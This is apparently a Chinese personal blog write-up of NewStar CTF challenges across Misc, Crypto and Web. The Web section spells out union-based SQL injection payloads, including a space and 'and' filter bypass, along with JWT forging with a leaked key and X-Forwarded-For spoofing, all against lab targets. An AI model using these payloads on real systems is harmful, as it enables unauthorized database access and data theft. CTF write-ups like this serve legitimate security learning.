---
layout: post
title: NewStar WP
date: 2024-12-16 14:50:50 +0800
categories: [ctf赛集（）]
---

## Misc

### week1
#### 兑换码

![]({{ site.baseurl }}/assets/images/荣花与炎日之途.png)
（这里可能显示不出来不知道为什么）
图片首先打开发现
哦不是op（原
没什么发现
然后拖去010看看没发现什么特别的
根据题目说什么在png下面，猜测可能是要修改宽高
看看图片应该可能是高度
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-05 230338.png)
所以直接修改高度，这里随便改的
得到
![]({{ site.baseurl }}/assets/images/荣花与炎日之途2.png)
最下方可以看见flag

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-05 173632.png)


#### WhereIsFlag

首先要装好nc，ncat
然后这里用的是linux的
nc 连接好，出现题目（应该是ai题，但是这个好像不是套路ai的ha
这里是讲ls，cat，cd的用法，所以应该只会用到这几个命令
不熟悉可以问问这个ai，ls/cd+目录，cat+文件名
（具体作用可以查查，ls主要显示目录，cd转移目录，cat展示文件内容，可以粗略理解）

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-05 231520.png)

有一行提示，假的flag在root的dir（开始不相信试了试发现真的没骗我，因为root的目录不让进）
个人的话其实是一个个试的，看能不能进去
其中home和proc可以进（只试到这里了）
但是home这个是假的
所以进proc，而且她的这个em提示词吧，也感觉是找对了
然后ls一下

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-05 231557.png)
继续查，因为不清楚所以个人一个个查的（毕竟经验不足）
self这里有文件，所以flag应该在某个文件里

![]({{ site.baseurl }}/assets/images/Pasted image 20241005231653.png)
继续查文件，到了environ出现flag![]({{ site.baseurl }}/assets/images/Pasted image 20241005231424.png)
#### decompress

拿到之后，发现真的很多压缩包
一个个解压然后得到一个要密码的压缩包和一个提示
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-05 235939.png)

这个其实我也不是很清楚，搜索一下发现是正则表达式
意思是密码的组成由：a到z的字母3个，一个数字，a到z的字母一个
一共五个字符
这里是直接暴破（要点时间）

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 215550.png)
得到密码xtr4m
然后拿过去解压
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 220907.png)


![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 220851.png)

拿到flag
#### pleasingMusic

首先拿到音频，拖到Audacity
可以试听一下很明显后面那段是摩斯密码
把它图形延长扩大，然后拖动一下
这样看摩斯密码更明显
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-07 005102.png)
手动记录摩斯密码
根据题目显示正反都好，所以可能要注意反向
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-07 005035.png)
这里我是首先正向输入就是从左往右输入发现解码不对劲
然后反着来，发现解码正常
（这里用的厨子，也可以在在线网站搜解码）
得到flag

![]({{ site.baseurl }}/assets/images/Pasted image 20241007005151.png)
#### Labyrinth
（因为不是很会玩stegsolve，导致没写（悲
【stegsolve这里一般戳下面的两箭头就可以看到不同状态的图片】


![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-08 211640.png)

直接二维码扫描即可
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-08 211921.png)
### week2
#### wireshark_checkin

流量分析，首先用鲨鱼打开，然后在里面寻找一下
发现这个有flag.txt
点开发现下面yflag
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 221248.png)
#### wireshark_secret

流量分析，首先拿到鲨鱼里去
通过寻找，然后看到这个里面（PNG）
感觉是里面有图片，而且题目说什么偷偷看涩图，所以应该是图片没错
戳开这个发现里面确实藏有图片，把它分离出来，尾缀png命名

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 222043.png)

得到这个图片，很明显啊，拿到flag
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 222058.png)
#### 用溯流仪见证伏特台风

首先这边也是看了给的哔哩哔哩视频，然后确实操作方法知道了
但是还是更想看直接的（视频截图特别糊，看不清）
所以上网搜这个事件和有关报道
在这个报道发现高清图


![]({{ site.baseurl }}/assets/images/Pasted image 20241006230100.png)
![]({{ site.baseurl }}/assets/images/Pasted image 20241006230041.png)

然后就直接拿来md5加密，得到flag


没什么硬翻译
对着看
发现左上角解除来是提示
flag是个句子sentence
然后左下角也是提示
doyouknowfence
你知道栅栏吗
所以是栅栏密码（开始一直不知道，还误以为这个提示是flag，结果不是）

翻译右下角的
![]({{ site.baseurl }}/assets/images/Pasted image 20241031223109.png)

拖到栅栏密码里（栅栏密码要输入不同的key值得到不同的结果（和凯撒有一点点像））
key输入3时出现句子
得到flag

![]({{ site.baseurl }}/assets/images/Pasted image 20241031222751.png)
## Crypto

### week1
#### Base
拿题一看，应该是base解码
直接随波逐流一下，得到flag
（看来是base多重解码捏）
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-05 233124.png)

#### XOR

写脚本然后解密

给了key字节型的
m1是把flag内容取前12位然后用这个bytes_to_long函数转化
m2就是flag从第13位开始的后面全部
c1是key用那个函数转化了和m1异或
c2是key和m2异或

思路很清晰

要得到flag
就是要得到反转化的m1和m2

下面是vscode和pycharm的成功实现

![]({{ site.baseurl }}/assets/images/Pasted image 20241028225835.png)
![]({{ site.baseurl }}/assets/images/Pasted image 20241028231312.png)
XOR异或，两种符号都能表示，xor（）和^
用起来就是c=a^ b,那么a=c^ b就是可以互换这种，也是一种特性

bytes_to_long（）和long_to_bytes（）这是相反的，逆着用
注意使用时最开始标注一下这俩，<mark>用到哪个就注明</mark>，不然会报错（深刻体会）

#### Strange King
     某喜欢抽锐刻 5 的皇帝想每天进步一些，直到他娶了个模，回到原点，全部白给😅 这是他最后留下的讯息：ksjr{EcxvpdErSvcDgdgEzxqjql}，flag 包裹的是可读的明文
     
首先猜测就是ksjr就是flag的变换
凯撒就是要先找找偏移
![]({{ site.baseurl }}/assets/images/Pasted image 20241110092414.png)

题目描述中的数字 5 就是**初始偏移量**。
「每天进步一些」代表**偏移量在递增**，对 26 取模后会到原点，偏移量每次增加是 26 的因子，此处是 2.
![]({{ site.baseurl }}/assets/images/Pasted image 20241110091628.png)
## WEB

### week1
#### headach3

打开两行英文，头疼要找医生
（有点头绪但不多）
直接f12查看一下好了
head嘛头，所以感觉与头文件，响应头等等有关
这里网络查看一下，消息头这边可以直接看到flag
（其实用bp应该也行，说不定更明显，这里head应该就是直接把flag当作头了）
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 001533.png)
#### 谢谢皮蛋

要输入id（开始看错了还以为是找密码，密码写多了ei）
试试输入1，显示了name和position
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 002558.png)

所以应该是sql注入很明显
那先按常规步骤
判断类型
恒真式，1 and 1=1 有回显
1=2没有，
所以应该是数字型
下一步看看存在几列数据，
1 order by 1，1 order by 2，1 order by 3这样
到3出现这个
![]({{ site.baseurl }}/assets/images/Pasted image 20241006003052.png)
所以是2列
然后进行联合查询了，这里引入union，
然后先数据库从库开始查询
-1 union select 1,database()
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 003319.png)
爆出ctf这个库
然后继续爆表
    `select * from news where id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctf'`
得到两个表
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 003430.png)
感觉flag出来了
继续爆列
`select * from news where id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='Fl4g'`
得到
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 003510.png)
直觉选择看value
所以输入-1 union select 1,value from ctf.Fl4g
然后得到flag
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 003630.png)

#### PangBai 过家家（1）
    这个题真的好长555

开始一段片头，过后应该会跳转到这个第一关
参考wp输入/start可以直接跳过
到达第一关
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154211.png)

头部，所以应该是请求头那里会有发现
直接F12
可以看到location怪怪的
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154318.png)
尝试访问一下
成功到达下一关
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154453.png)
很明显意思是传参
这里用get传参一下（用的hackbar）
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154549.png)

成功
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154618.png)
另一种方法所以是POST传参
用POST传参就好
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154641.png)
可能会出现这种没传过去，因为可以看到这个请求头还是GET，按理来说应该变成了POST（这里多传几次，差不多刷新excute就好了）
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154736.png)
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 154833.png)
说要Papa的话才行，所以应该是修改User-Agent为Papa
这里直接修改为Papa没有反应
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 165239.png)
查一下Use-Agent格式
比如 User-Agent: Mozilla/5.0 (system-information)....

所以应该是会带版本号，产品号这种的
（一般的题可能不带也行，但是这里必须带）

随意带/1.0
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 220933.png)

要我们说玛卡巴卡（bushi）
直接修改那个hello就行（这里因为另一个hackbar好像传不上去，所以换了一个...，按理来应该是可以的）
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-01 222223.png)

要提交一个补丁包
（涨知识）
用PATCH的方法，就是修改一下请求头就行，把POST改为PATCH
补丁包的话
参考wp，说是multipart/form-data这种格式
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 164134.png)
     （没错这里是那个直播的截图）

简单来说就是要传补丁包，首先要修改这个Content-Type为这种格式
Content-Type: multipart/form-data; boundary=**e48c73**
这里的`boundary` 后面是作为字符串分界线
就是说`boundary`后面自定义（一般英文好一点哈）
会作为下面写包的格式的那个分界线号一样

基本格式
--e48c73a7a42e403d868095dc3d060962
Content-Disposition: form-data; name="field0"

value1
--e48c73a7a42e403d868095dc3d060962
Content-Disposition: form-data; name="field1"；filename="filename"

value2
<mark>--e48c73a7a42e403d868095dc3d060962--</mark>
（这里最后是前后都有--，作为结尾）

大致如此
这里传包好像只能用bp这种抓包的或者是用vscode这种
这边是用的vscode（自己用bp按这个格式写的传不过去很奇怪）
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 173250.png)
这里注意要首先新建一个以`.http`或者`.rest` 结尾的文件，填入HTTP请求，点击`Send Request`，或者右键选择`Send Request`，或者直接用快捷键 Ctrl+Alt+R ，就执行了，然后API Response就会显示在右边区域。

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 173503.png)
成功传入
把这边响应的cookie的token复制一下，在网站那边输入，就可以实现网站的跳转到下一关
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 173452.png)
localhost所以是修改为本地的ip嘛
直接XFF改为127.0.0.1
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 173655.png)

这里提到了 JWT 和 `Pe2K7kxo8NMIkaeN`，这个数字和字母组成内容推测应当是 JWT 的密钥。
    JWT 是一个轻量级的认证规范，允许在用户和服务器之间传递安全可靠的信息，但这是基于签名密钥没有泄露的情况下。可以通过 [JWT.IO](https://jwt.io/) 网站进行在线签名和验证（JWT 并不对数据进行加密，而仅仅是签名，不同的数据对应的羡签名不一样，因此在没有密钥的情况下，你可以查看里面的数据，但修改它则会导致服务器验签失败，从而拒绝你的进一步请求）。
（参考wp的jwt，确实是不知道）

把当前的cookie的token传入这边encoded
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 174506.png)

然后修改level 6为0
（这里我也不知道为什么，但是提示其实可以看出要修改的，至于为什么是0，看了wp我只能说很..无语.........）
这里放一下原因
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 174339.png)

然后在那个密钥secret处填写给的密钥
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 174639 1.png)
发现这个encoded这边会改变
复制填入网站中得到新页面
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 174726.png)
戳从梦中醒来
一个小片尾，然后出现flag
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-11-02 175005.png)



#### 智械危机


`cmd` 参数是**Base64 编码后**的 `system` 命令。

`key` 的验证逻辑：将cmd 参数值字符串翻转后，计算 MD5 哈希，并与 Base64 解码后的 `key` 进行比较。



### week2
#### 谢谢皮蛋 plus

     这次是空格和 `and` 的绕过（开始写的时候确实没想到55）

输1正常，1‘也正常，1“报错
通过报错看出是双引号
![]({{ site.baseurl }}/assets/images/Pasted image 20241102234204.png)

因为按正常的来写只会得到那个powerless
所以应该是绕过了什么
这里是绕过and和空格
把and使用 &&替换，空格使用 `/**/` 替换

1"/**/&&/**/"1"="1
1"/**/&&/**/"1"="2
输2没回显，说明这样成功绕过
![]({{ site.baseurl }}/assets/images/Pasted image 20241102235653.png)

感觉还绕过了--+，---，用#就可以
所以后面尾缀都带#
1"/**/order/**/by/**/1,2,3#

成功查出只有两列，第三列没有
![]({{ site.baseurl }}/assets/images/Pasted image 20241103000905.png)
按常规来爆库，爆表，爆列，会发现和之前那个一样
-1"/**/union/**/select/**/1,database()#
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 003319.png)
-1"/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'#
![]({{ site.baseurl }}/assets/images/Pasted image 20241103001111.png)
-1"/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='Fl4g'#
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-06 003510.png)
-1"/**/union/**/select/**/1,value/**/from/**/ctf.Fl4g#
![]({{ site.baseurl }}/assets/images/Pasted image 20241103001626.png)
得到flag
